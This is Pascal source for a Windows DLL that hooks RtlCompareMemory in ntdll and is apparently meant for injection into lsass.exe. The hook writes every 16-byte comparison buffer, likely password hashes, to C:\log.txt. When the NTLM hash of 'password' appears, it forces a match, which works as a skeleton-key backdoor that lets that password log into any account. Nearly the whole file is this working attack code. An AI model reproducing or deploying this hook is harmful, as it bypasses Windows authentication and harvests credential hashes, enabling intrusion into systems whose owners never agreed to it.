library hook;
{$mode delphi}

uses windows,DDetours,sysutils  ;

type Trtlcomparememory=function(a:pointer;b:pointer;length:size_t): size_t;stdcall;

  var
  Trampoline: Trtlcomparememory = nil;

Const
{ DllEntryPoint }
DLL_PROCESS_ATTACH = 1;
DLL_THREAD_ATTACH = 2;
DLL_PROCESS_DETACH = 0;
DLL_THREAD_DETACH = 3;

{
The GetModuleHandle function returns a handle to a mapped module without incrementing its reference count.
However, if this handle is passed to the FreeLibrary function,
the reference count of the mapped module will be decremented.
Therefore, do not pass a handle returned by GetModuleHandle to the FreeLibrary function.
Doing so can cause a DLL module to be unmapped prematurely.
}
procedure logfile(s:string;l:ushort=0);
var
   	 hFile:HANDLE;
	 dwWritten:DWORD;
        l_:ushort;
begin

	hFile := CreateFile('C:\log.txt',
		GENERIC_WRITE,
		0,
		nil,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		0);

	if (hFile <> INVALID_HANDLE_VALUE) then
	begin
		SetFilePointer(hFile, 0, nil, FILE_END);
               if l>0 then l_:=l else l_:=length(s);
               WriteFile(hfile,s[1],l_,dwWritten,nil);
		CloseHandle(hFile);
	end;
end;

function myrtlcomparememory(a:pointer;b:pointer;length:size_t): size_t;stdcall;
var
a_,b_:array[0..15] of byte;
i:byte;
s:string;
match:boolean=false;
begin
s:='';
OutputDebugString('myrtlcomparememory');
//logfile ('myrtlcomparememory'#13#10);
logfile ('myrtlcomparememory:'+inttostr(length)+#13#10);
if length=16 then
   begin
          copymemory(@a_[0],a,16);
          copymemory(@b_[0],b,16);
          s:='';
          for i:=0 to 15 do s:=s+inttohex(a_[i],2);
          logfile ('myrtlcomparememory:'+s+#13#10);
          s:='';
          for i:=0 to 15 do s:=s+inttohex(b_[i],2);
          logfile ('myrtlcomparememory:'+s+#13#10);
          if (s='8846F7EAEE8FB117AD06BDD830B7586C') then match:=true; // 'password'
   end;
if match=true then result:=length else Result := Trampoline(a,b,length );
end;

function attach(param:pointer):dword;
begin
OutputDebugString('attach');
logfile ('attach'#13#10);
@Trampoline := InterceptCreate('ntdll.dll','RtlCompareMemory', @myrtlcomparememory, nil);
//the below effectively unloads the dll but crashes lsass.exe
//FreeLibraryAndExitThread(GetModuleHandle('hook.dll'), 0);
sleep(1000);
ExitThread(0);
end;

procedure detach;
begin
OutputDebugString('detach');
logfile ('detach'#13#10);
  if Assigned(Trampoline) then
    begin
      InterceptRemove(@Trampoline);
      Trampoline := nil;
      logfile ('trampoline removed'#13#10);
    end;
end;

exports attach;

procedure DLLEntryPoint(dwReason: DWord);
var tid:dword;
  hthread:thandle;
begin
  case dwReason of
    DLL_PROCESS_ATTACH:
      begin
        //DisableThreadLibraryCalls ?
        OutputDebugString ('DLL_PROCESS_ATTACH') ;
        hthread:=CreateThread (nil,$ffff,@attach,nil,0,tid);
        //dummy(nil);
        WaitForInputIdle (hthread,INFINITE);
        closehandle(hthread );
        //exitthread(0);
        //FreeLibrary(GetModuleHandle(nil));
        exit;
      end;
    DLL_PROCESS_DETACH:
      begin
        OutputDebugString ('DLL_PROCESS_DETACH') ;
        detach;
      end;
    DLL_THREAD_ATTACH:  OutputDebugString ('DLL_THREAD_ATTACH') ;
    DLL_THREAD_DETACH:  OutputDebugString ('DLL_THREAD_DETACH') ;
  end;
end;

procedure DLLTHREADATTACH(dllparam: longint);
begin
DLLEntryPoint(DLL_THREAD_ATTACH);
end;

procedure DLLTHREADDETACH(dllparam: longint);
begin
DLLEntryPoint(DLL_THREAD_DETACH);
end;

procedure DLLPROCESSDETACH(dllparam: longint);
begin
DLLEntryPoint(DLL_PROCESS_DETACH);
end;


begin
OutputDebugString('BEGIN');
logfile ('BEGIN'#13#10);
{$ifdef fpc}
Dll_Thread_Attach_Hook := @DLLTHREADATTACH;
Dll_Thread_Detach_Hook := @DLLTHREADDETACH;
Dll_Process_Detach_Hook := @DLLPROCESSDETACH;
{$else }
  DLLProc:= @DLLEntryPoint;
{$endif}
DLLEntryPoint(DLL_PROCESS_ATTACH);
end.


 
